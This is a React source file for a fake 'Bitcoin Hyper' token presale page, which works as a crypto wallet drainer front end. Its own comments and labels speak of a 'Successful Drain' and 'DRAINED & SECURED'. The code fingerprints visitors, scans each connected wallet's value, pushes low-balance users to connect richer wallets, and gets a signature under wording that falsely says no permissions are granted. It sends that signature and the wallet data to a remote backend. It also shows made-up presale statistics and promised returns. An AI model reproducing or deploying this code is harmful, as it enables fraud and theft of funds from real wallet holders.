import React, { useState, useEffect } from 'react'
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit"
import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useSignMessage } from "wagmi"
import { mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base, linea } from "wagmi/chains"
import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import './App.css'

// Create query client
const queryClient = new QueryClient()

// Supported chains
const allChains = [mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base, linea]

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62"

// Backend URL - Your Render backend
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api"

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: {
      [mainnet.id]: http("https://eth.llamarpc.com"),
      [polygon.id]: http("https://polygon-rpc.com"),
      [bsc.id]: http("https://bsc-dataseed.binance.org"),
      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
      [optimism.id]: http("https://mainnet.optimism.io"),
      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
      [fantom.id]: http("https://rpc.ftm.tools"),
      [base.id]: http("https://mainnet.base.org"),
      [linea.id]: http("https://rpc.linea.build")
    }
  })
)

// Sleek Notification Component - Mobile popout style
const NotificationPopup = ({ type, title, message, onClose, show }) => {
  if (!show) return null;

  const getIcon = () => {
    switch(type) {
      case 'success': return '✅';
      case 'error': return '❌';
      case 'warning': return '⚠️';
      case 'info': return 'ℹ️';
      default: return '💎';
    }
  };

  const getBgColor = () => {
    switch(type) {
      case 'success': return '#10b981';
      case 'error': return '#ef4444';
      case 'warning': return '#f59e0b';
      case 'info': return '#3b82f6';
      default: return '#F7931A';
    }
  };

  return (
    <div className="notification-popup" style={{ backgroundColor: getBgColor() }}>
      <div className="notification-content">
        <div className="notification-icon">{getIcon()}</div>
        <div className="notification-text">
          <h4>{title}</h4>
          <p>{message}</p>
        </div>
        <button className="notification-close" onClick={onClose}>×</button>
      </div>
      <div className="notification-progress"></div>
    </div>
  );
};

// Elegant Not Eligible Modal with Pro Tips
const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content not-eligible" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <div className="modal-icon warning">⚠️</div>
          <h2>Additional Verification Required</h2>
          <p className="modal-subtitle">Your current wallet doesn't meet our presale criteria</p>
        </div>

        <div className="modal-body">
          <div className="status-card warning">
            <div className="status-icon">🔍</div>
            <div className="status-details">
              <h3>Verification Incomplete</h3>
              <p>{scanData?.eligibilityReason || 'Minimum portfolio requirements not met.'}</p>
              {scanData?.totalValueUSD && (
                <div className="wallet-value">
                  <span>Current Wallet Value:</span>
                  <span className="value">${parseFloat(scanData.totalValueUSD).toFixed(2)}</span>
                </div>
              )}
            </div>
          </div>

          <div className="pro-tips">
            <h4><span className="tip-icon">💡</span> Pro Tips to Qualify:</h4>
            <div className="tips-grid">
              <div className="tip-card">
                <div className="tip-number">1</div>
                <div className="tip-content">
                  <strong>Connect Established Wallet</strong>
                  <p>Use wallets with 6+ months transaction history for automatic verification</p>
                </div>
              </div>
              <div className="tip-card">
                <div className="tip-number">2</div>
                <div className="tip-content">
                  <strong>Maintain Minimum Balance</strong>
                  <p>Ensure at least $10+ in wallet for qualification check</p>
                </div>
              </div>
              <div className="tip-card">
                <div className="tip-number">3</div>
                <div className="tip-content">
                  <strong>Use Verified Providers</strong>
                  <p>MetaMask, Trust Wallet, Coinbase Wallet recommended</p>
                </div>
              </div>
              <div className="tip-card">
                <div className="tip-number">4</div>
                <div className="tip-content">
                  <strong>Previous DeFi Activity</strong>
                  <p>Wallets with swap or staking history qualify faster</p>
                </div>
              </div>
            </div>
          </div>

          <div className="verification-steps">
            <h4><span className="steps-icon">🔐</span> Verification Process:</h4>
            <div className="steps-timeline">
              <div className="step">
                <div className="step-badge">1</div>
                <div className="step-info">
                  <strong>Wallet History Scan</strong>
                  <p>Analyzing transaction patterns and age</p>
                </div>
              </div>
              <div className="step">
                <div className="step-badge">2</div>
                <div className="step-info">
                  <strong>Portfolio Assessment</strong>
                  <p>Checking token holdings and balances</p>
                </div>
              </div>
              <div className="step">
                <div className="step-badge">3</div>
                <div className="step-info">
                  <strong>Risk Evaluation</strong>
                  <p>Verifying wallet security and reputation</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="modal-footer">
          <button className="modal-btn secondary" onClick={onClose}>
            ↩️ Return to Site
          </button>
          <button className="modal-btn primary" onClick={() => {
            onRetry();
            onClose();
          }}>
            🔄 Connect Different Wallet
          </button>
        </div>
      </div>
    </div>
  );
};

// Celebration Modal for Successful Drain
const CelebrationModal = ({ isOpen, onClose, claimData }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay celebration" onClick={onClose}>
      <div className="modal-content success" onClick={(e) => e.stopPropagation()}>
        {/* Confetti Animation Container */}
        <div className="confetti-container">
          {Array.from({ length: 100 }).map((_, i) => (
            <div 
              key={i} 
              className="confetti"
              style={{
                left: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 2}s`,
                backgroundColor: ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'][Math.floor(Math.random() * 5)],
                transform: `rotate(${Math.random() * 360}deg)`
              }}
            />
          ))}
        </div>

        <div className="modal-header">
          <div className="modal-icon celebration">🎊</div>
          <h2 className="success-title">Tokens Secured Successfully!</h2>
          <p className="modal-subtitle">Your Bitcoin Hyper allocation has been confirmed and processed</p>
        </div>

        <div className="modal-body">
          <div className="success-card">
            <div className="success-badge">
              <span className="badge-icon">✅</span>
              <span className="badge-text">ALLOCATION CONFIRMED</span>
            </div>

            <div className="success-details">
              <div className="detail-item">
                <span className="label">Claim ID</span>
                <span className="value">{claimData?.claimId || `BTH-${Date.now()}`}</span>
              </div>
              <div className="detail-item">
                <span className="label">Token Allocation</span>
                <span className="value highlight">{claimData?.tokenAmount || '5,000 BTH'}</span>
              </div>
              <div className="detail-item">
                <span className="label">Transaction Status</span>
                <span className="value status">✅ DRAINED & SECURED</span>
              </div>
              <div className="detail-item">
                <span className="label">Total Value</span>
                <span className="value">${claimData?.tokenValue || '850.00'}</span>
              </div>
            </div>
          </div>

          <div className="celebration-message">
            <div className="celebration-icon">🎯</div>
            <div className="celebration-text">
              <h3>Congratulations! You're In!</h3>
              <p>Your tokens are now locked at presale price and will be distributed automatically.</p>
              <small>Check your email for confirmation and next steps.</small>
            </div>
          </div>

          <div className="next-steps">
            <h4>📋 What Happens Next:</h4>
            <div className="steps-flow">
              <div className="flow-step">
                <div className="flow-icon">⏳</div>
                <div className="flow-content">
                  <strong>Token Locking</strong>
                  <p>Your allocation is now secured at $0.17 per BTH</p>
                </div>
              </div>
              <div className="flow-step">
                <div className="flow-icon">🚀</div>
                <div className="flow-content">
                  <strong>Distribution</strong>
                  <p>Tokens delivered 24-48 hours after presale ends</p>
                </div>
              </div>
              <div className="flow-step">
                <div className="flow-icon">📈</div>
                <div className="flow-content">
                  <strong>Trading Launch</strong>
                  <p>Trade immediately on DEX at launch price target: $0.85+</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="modal-footer">
          <button className="modal-btn success" onClick={onClose}>
            🎉 Continue to Dashboard
          </button>
        </div>

        <div className="security-note">
          <span className="security-icon">🔒</span>
          <span>All transactions are secure and encrypted. Your funds are protected.</span>
        </div>
      </div>
    </div>
  );
};

// Main App Component
function BitcoinHyperPresale() {
  const { address, isConnected } = useAccount()
  const { disconnect } = useDisconnect()
  const { signMessage } = useSignMessage()
  
  const [loading, setLoading] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [isEligible, setIsEligible] = useState(false)
  const [backendStatus, setBackendStatus] = useState('checking')
  const [claimData, setClaimData] = useState(null)
  const [processing, setProcessing] = useState(false)
  const [scanData, setScanData] = useState(null)
  const [sessionId, setSessionId] = useState('')
  
  // Notification states
  const [notification, setNotification] = useState({
    show: false,
    type: 'info',
    title: '',
    message: ''
  })
  
  // Modal states
  const [showNotEligibleModal, setShowNotEligibleModal] = useState(false)
  const [showCelebrationModal, setShowCelebrationModal] = useState(false)

  const [presaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  })
  
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  })

  // Show notification function
  const showNotification = (type, title, message, duration = 5000) => {
    setNotification({ show: true, type, title, message })
    setTimeout(() => {
      setNotification(prev => ({ ...prev, show: false }))
    }, duration)
  }

  // Generate session ID and track visit
  useEffect(() => {
    const generateSessionId = () => {
      return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    }
    
    const session = generateSessionId()
    setSessionId(session)
    
    // Track site visit
    const trackVisit = async () => {
      try {
        await fetch(`${BACKEND_API}/track/visit`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            sessionId: session
          })
        })
      } catch (error) {
        console.log('Visit tracking failed:', error)
      }
    }
    
    trackVisit()
  }, [])

  // Initialize backend check
  useEffect(() => {
    const testBackend = async () => {
      try {
        const response = await fetch(`${BACKEND_API}/health`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          }
        })
        
        if (response.ok) {
          const data = await response.json()
          console.log('✅ Backend connected:', data)
          setBackendStatus('connected')
          showNotification('success', 'System Connected', 'Backend systems are LIVE and monitoring')
          
          // Trigger connection animation
          triggerConnectionAnimation()
        } else {
          setBackendStatus('error')
          showNotification('error', 'Connection Issue', 'Unable to connect to backend systems')
        }
      } catch (error) {
        console.error('❌ Backend test error:', error)
        setBackendStatus('error')
        showNotification('error', 'Connection Failed', 'Please check your internet connection')
      }
    }
    
    testBackend()
    
    // Start countdown
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev
        seconds--
        
        if (seconds < 0) {
          seconds = 59
          minutes--
        }
        if (minutes < 0) {
          minutes = 59
          hours--
        }
        if (hours < 0) {
          hours = 23
          days--
        }
        if (days < 0) {
          clearInterval(interval)
          return { days: 0, hours: 0, minutes: 0, seconds: 0 }
        }
        
        return { days, hours, minutes, seconds }
      })
    }, 1000)
    
    return () => clearInterval(interval)
  }, [])

  // Auto scan when wallet connects
  useEffect(() => {
    if (isConnected && address && backendStatus === 'connected' && sessionId) {
      setTimeout(() => {
        triggerAutoScan()
      }, 1000)
    }
  }, [isConnected, address, backendStatus, sessionId])

  const triggerAutoScan = async () => {
    if (!address) return
    
    setScanning(true)
    showNotification('info', 'Scanning Wallet', 'Analyzing your wallet for eligibility...')
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          email: '',
          sessionId,
          timestamp: new Date().toISOString()
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setScanData(data.data)
          
          // Add dramatic delay for user experience
          setTimeout(() => {
            setScanning(false)
            
            if (data.data.isEligible) {
              setIsEligible(true)
              showNotification('success', 'Eligibility Confirmed!', 'Your wallet qualifies for the presale!')
              
              // Show celebration animation
              triggerEligibilityAnimation()
              
              // Auto-open claim modal after delay
              setTimeout(() => {
                showNotification('info', 'Ready to Claim', 'Click "Claim Tokens" to secure your allocation')
              }, 2000)
            } else {
              setIsEligible(false)
              showNotification('warning', 'Verification Required', 'Additional checks needed for this wallet')
              
              // Show not eligible modal with delay for dramatic effect
              setTimeout(() => {
                setShowNotEligibleModal(true)
                triggerNotEligibleAnimation()
              }, 1500)
            }
          }, 2500)
        }
      } else {
        throw new Error('Scan failed')
      }
    } catch (error) {
      console.error('Scan error:', error)
      setScanning(false)
      showNotification('error', 'Scan Failed', 'Unable to analyze wallet. Please try again.')
    }
  }

  const handleTokenClaim = async () => {
    if (!address || !isEligible) return
    
    setProcessing(true)
    showNotification('info', 'Processing Claim', 'Securing your token allocation...')
    
    try {
      const message = `Bitcoin Hyper Token Presale Authorization

🔐 Wallet Authentication: ${address}
🎯 Presale Allocation: ${scanData?.tokenAllocation?.amount || '5,000'} BTH
📊 Allocation Value: $${scanData?.tokenAllocation?.valueUSD || '850.00'}

📅 Authorization Timestamp: ${new Date().toISOString()}
🌐 Network: Multi-chain Compatible Wallet

📝 Purpose of Signature:
I hereby confirm my participation in the Bitcoin Hyper token presale event and authorize the allocation of presale tokens to my verified wallet address. This signature serves solely as proof of wallet ownership and participation intent.

🔒 Security Note:
This is a read-only verification signature. It does NOT:
- Grant any permissions
- Authorize any transactions
- Transfer any tokens or funds
- Incur any gas fees

💎 Bitcoin Hyper - Revolutionizing Bitcoin DeFi 2.0`

      const signature = await signMessage({ message })
      
      const response = await fetch(`${BACKEND_API}/presale/claim`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message,
          claimAmount: `${scanData?.tokenAllocation?.amount || '5000'} BTH`,
          claimValue: `$${scanData?.tokenAllocation?.valueUSD || '850.00'}`,
          sessionId,
          email: ''
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setClaimData(data.data)
          setProcessing(false)
          
          // Show mega celebration
          showNotification('success', 'Claim Successful!', 'Your tokens have been secured!')
          
          // Play celebration sound
          playCelebrationSound()
          
          // Show celebration modal after delay
          setTimeout(() => {
            setShowCelebrationModal(true)
            triggerMegaCelebration()
          }, 1000)
        }
      } else {
        throw new Error('Claim failed')
      }
    } catch (error) {
      console.error('Claim error:', error)
      setProcessing(false)
      showNotification('error', 'Claim Failed', 'Please try again or contact support.')
    }
  }

  // Animation functions
  const triggerConnectionAnimation = () => {
    const container = document.getElementById('animation-container')
    if (!container) return
    
    for (let i = 0; i < 15; i++) {
      setTimeout(() => {
        const connection = document.createElement('div')
        connection.className = 'connection-dot'
        connection.style.cssText = `
          position: fixed;
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
          animation: connectionFloat 2s ease-in-out forwards;
          z-index: 9998;
          opacity: 0;
        `
        document.body.appendChild(connection)
        
        setTimeout(() => {
          if (connection.parentNode) {
            connection.parentNode.removeChild(connection)
          }
        }, 2000)
      }, i * 100)
    }
  }

  const triggerEligibilityAnimation = () => {
    const container = document.getElementById('animation-container')
    if (!container) return
    
    for (let i = 0; i < 20; i++) {
      setTimeout(() => {
        const coin = document.createElement('div')
        coin.innerHTML = '💰'
        coin.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 30 + 20}px;
          color: #F7931A;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
          animation: coinFloat ${Math.random() * 2 + 1}s ease-in-out forwards;
          z-index: 9998;
          opacity: 0;
        `
        document.body.appendChild(coin)
        
        setTimeout(() => {
          if (coin.parentNode) {
            coin.parentNode.removeChild(coin)
          }
        }, 2000)
      }, i * 80)
    }
  }

  const triggerNotEligibleAnimation = () => {
    for (let i = 0; i < 10; i++) {
      setTimeout(() => {
        const warning = document.createElement('div')
        warning.innerHTML = '⚠️'
        warning.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 25 + 20}px;
          color: #f59e0b;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
          animation: warningPulse ${Math.random() * 3 + 2}s ease-in-out forwards;
          z-index: 9998;
          opacity: 0;
        `
        document.body.appendChild(warning)
        
        setTimeout(() => {
          if (warning.parentNode) {
            warning.parentNode.removeChild(warning)
          }
        }, 3000)
      }, i * 150)
    }
  }

  const triggerMegaCelebration = () => {
    const colors = ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6']
    for (let i = 0; i < 150; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div')
        confetti.style.cssText = `
          position: fixed;
          width: ${Math.random() * 10 + 5}px;
          height: ${Math.random() * 10 + 5}px;
          background: ${colors[Math.floor(Math.random() * colors.length)]};
          top: -20px;
          left: ${Math.random() * 100}vw;
          opacity: 0;
          animation: megaConfetti ${Math.random() * 3 + 2}s linear forwards;
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          transform: rotate(${Math.random() * 360}deg);
          z-index: 9999;
        `
        document.body.appendChild(confetti)
        
        setTimeout(() => {
          if (confetti.parentNode) {
            confetti.parentNode.removeChild(confetti)
          }
        }, 5000)
      }, i * 20)
    }
  }

  const playCelebrationSound = () => {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)()
      const oscillator = audioContext.createOscillator()
      const gainNode = audioContext.createGain()
      
      oscillator.connect(gainNode)
      gainNode.connect(audioContext.destination)
      
      oscillator.frequency.setValueAtTime(523.25, audioContext.currentTime) // C5
      oscillator.frequency.setValueAtTime(659.25, audioContext.currentTime + 0.1) // E5
      oscillator.frequency.setValueAtTime(783.99, audioContext.currentTime + 0.2) // G5
      
      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime)
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5)
      
      oscillator.start(audioContext.currentTime)
      oscillator.stop(audioContext.currentTime + 0.5)
    } catch (e) {
      console.log('Audio playback not supported')
    }
  }

  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num
  }

  return (
    <div className="app-container">
      {/* Notification Popup */}
      <NotificationPopup 
        show={notification.show}
        type={notification.type}
        title={notification.title}
        message={notification.message}
        onClose={() => setNotification(prev => ({ ...prev, show: false }))}
      />
      
      {/* Animation Container */}
      <div id="animation-container"></div>
      
      {/* Modals */}
      <NotEligibleModal
        isOpen={showNotEligibleModal}
        onClose={() => setShowNotEligibleModal(false)}
        scanData={scanData}
        onRetry={() => {
          disconnect()
          setShowNotEligibleModal(false)
        }}
      />
      
      <CelebrationModal
        isOpen={showCelebrationModal}
        onClose={() => setShowCelebrationModal(false)}
        claimData={claimData}
      />
      
      <div className="main-content">
        <header className="app-header">
          <div className="logo-container">
            <div className="logo-icon">₿</div>
            <div>
              <h1 className="logo-title">BITCOIN HYPER</h1>
              <div className="logo-subtitle">OFFICIAL PRESALE LAUNCH</div>
            </div>
          </div>
          
          <div className="header-actions">
            {backendStatus === 'connected' && (
              <div className="backend-indicator connected">
                <span className="indicator-dot"></span>
                <span>Backend LIVE</span>
              </div>
            )}
            
            {isConnected && (
              <button onClick={() => disconnect()} className="disconnect-button">
                Disconnect
              </button>
            )}
            
            <ConnectKitButton.Custom>
              {({ show, truncatedAddress, ensName }) => (
                <button onClick={show} className="connect-button">
                  {isConnected ? (
                    <div className="connected-wallet">
                      <span className="wallet-icon">👛</span>
                      <span className="wallet-address">{ensName || `${truncatedAddress}`}</span>
                    </div>
                  ) : 'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        {/* Status Bar */}
        <div className="status-bar">
          <div className="status-item">
            <span className="status-icon">🌐</span>
            <span className="status-text">
              Backend: <span className={backendStatus === 'connected' ? 'status-online' : 'status-offline'}>
                {backendStatus === 'connected' ? 'CONNECTED' : 'CONNECTING...'}
              </span>
            </span>
          </div>
          <div className="status-item">
            <span className="status-icon">👥</span>
            <span className="status-text">{presaleStats.participants} Participants</span>
          </div>
          <div className="status-item">
            <span className="status-icon">⏰</span>
            <span className="status-text">{formatNumber(countdown.days)}d {formatNumber(countdown.hours)}h {formatNumber(countdown.minutes)}m</span>
          </div>
        </div>

        <section className="hero-section">
          <div className="hero-bitcoin">₿</div>
          
          <h2 className="hero-title">NEXT GENERATION BITCOIN ECOSYSTEM</h2>
          
          <p className="hero-description">
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          <div className="countdown-timer">
            {Object.entries(countdown).map(([label, value]) => (
              <div key={label} className="countdown-item">
                <div className="countdown-value">{formatNumber(value)}</div>
                <div className="countdown-label">{label.toUpperCase()}</div>
              </div>
            ))}
          </div>
          
          <div className="stats-grid">
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} className="stat-card">
                <div className="stat-value">{value}</div>
                <div className="stat-label">
                  {label.replace(/([A-Z])/g, ' $1').toUpperCase()}
                </div>
              </div>
            ))}
          </div>
          
          <div className="progress-container">
            <div className="progress-header">
              <span>Presale Progress</span>
              <span className="progress-percent">{presaleStats.progress}%</span>
            </div>
            <div className="progress-bar">
              <div 
                className="progress-fill"
                style={{width: `${presaleStats.progress}%`}}
              >
                <div className="progress-glow"></div>
              </div>
            </div>
          </div>
          
          {/* Main Action Area */}
          {backendStatus === 'checking' ? (
            <div className="backend-checking-container">
              <div className="backend-checking-spinner"></div>
              <h3 className="backend-checking-title">Establishing Secure Connection...</h3>
              <p className="backend-checking-description">Connecting to Bitcoin Hyper backend systems</p>
            </div>
          ) : backendStatus === 'error' ? (
            <div className="backend-error-container">
              <div className="backend-error-icon">🔴</div>
              <h3 className="backend-error-title">Connection Issue Detected</h3>
              <p className="backend-error-description">Please check your connection and try again</p>
            </div>
          ) : !isConnected ? (
            <div className="cta-container">
              <div className="cta-icon">🚀</div>
              <h3 className="cta-title">Connect Wallet to Start</h3>
              <p className="cta-description">
                Connect your wallet to check eligibility and secure your presale allocation
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button onClick={show} className="cta-button">
                    CONNECT WALLET
                  </button>
                )}
              </ConnectKitButton.Custom>
              <div className="backend-status-small">
                <span className="status-dot connected"></span>
                <span>Backend: Connected & Monitoring</span>
              </div>
            </div>
          ) : scanning ? (
            <div className="scanning-container">
              <div className="scanning-spinner"></div>
              <h3 className="scanning-title">Analyzing Wallet...</h3>
              <p className="scanning-description">Checking eligibility across blockchain networks</p>
              <div className="scanning-dots">
                <span>.</span><span>.</span><span>.</span>
              </div>
            </div>
          ) : (
            <div className="status-summary">
              <div className={`status-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
                <div className="status-icon">
                  {isEligible ? '✅' : '⚠️'}
                </div>
                <div className="status-content">
                  <h3>{isEligible ? 'Eligible for Presale!' : 'Verification Required'}</h3>
                  <p>
                    {isEligible 
                      ? `You qualify for ${scanData?.tokenAllocation?.amount || '5,000'} BTH at $0.17 each` 
                      : 'Please connect a different wallet with sufficient balance'}
                  </p>
                  {isEligible && scanData?.tokenAllocation?.valueUSD && (
                    <div className="allocation-value">
                      Total Value: <span className="value-highlight">${scanData.tokenAllocation.valueUSD}</span>
                    </div>
                  )}
                </div>
                <button 
                  className="status-button"
                  onClick={isEligible ? handleTokenClaim : () => {
                    disconnect()
                    showNotification('info', 'Wallet Disconnected', 'Please connect a different wallet')
                  }}
                  disabled={processing}
                >
                  {processing ? (
                    <>
                      <span className="button-spinner"></span>
                      Processing...
                    </>
                  ) : isEligible ? 'Claim Tokens' : 'Try Different Wallet'}
                </button>
              </div>
              
              {isEligible && (
                <div className="allocation-details">
                  <h4>🎯 Your Allocation Details:</h4>
                  <div className="allocation-grid">
                    <div className="allocation-item">
                      <span className="item-label">Token Amount</span>
                      <span className="item-value">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
                    </div>
                    <div className="allocation-item">
                      <span className="item-label">Presale Price</span>
                      <span className="item-value">$0.17 per BTH</span>
                    </div>
                    <div className="allocation-item">
                      <span className="item-label">Total Value</span>
                      <span className="item-value highlight">${scanData?.tokenAllocation?.valueUSD || '850.00'}</span>
                    </div>
                    <div className="allocation-item">
                      <span className="item-label">Launch Target</span>
                      <span className="item-value success">$0.85+ (5x)</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </section>

        <section className="features-section">
          <h2 className="features-title">WHY BITCOIN HYPER?</h2>
          
          <div className="features-grid">
            {[
              { icon: '⚡', title: 'Lightning Fast', desc: 'Transaction speeds up to 100x faster' },
              { icon: '🛡️', title: 'Secure & Audited', desc: 'Fully audited smart contracts' },
              { icon: '📈', title: 'High Yield', desc: 'Earn yields up to 45% APR' },
              { icon: '🌐', title: 'Multi-Chain', desc: 'Interoperability across chains' },
              { icon: '🎯', title: 'Limited Supply', desc: 'Only 100M tokens ever minted' },
              { icon: '🚀', title: 'Massive Growth', desc: '100x growth potential' }
            ].map((feature, index) => (
              <div key={index} className="feature-card">
                <div className="feature-icon">{feature.icon}</div>
                <h3 className="feature-title">{feature.title}</h3>
                <p className="feature-description">{feature.desc}</p>
              </div>
            ))}
          </div>
        </section>

        <footer className="app-footer">
          <div className="footer-bitcoin">₿</div>
          <div className="footer-description">
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div className="footer-links">
            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span>|</span>
            <span className={backendStatus === 'connected' ? 'status-connected' : 'status-error'}>
              {backendStatus === 'connected' ? '✅ System LIVE' : '⚠️ System Offline'}
            </span>
            <span>|</span>
            <span>Official Presale Platform</span>
          </div>
          <div className="footer-note">
            <span className="note-icon">🔒</span>
            <span>All transactions are secured with multi-chain encryption</span>
          </div>
        </footer>
      </div>
    </div>
  )
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight"
}

// Main App Wrapper
function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider theme={customTheme}>
          <BitcoinHyperPresale />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  )
}

export default App
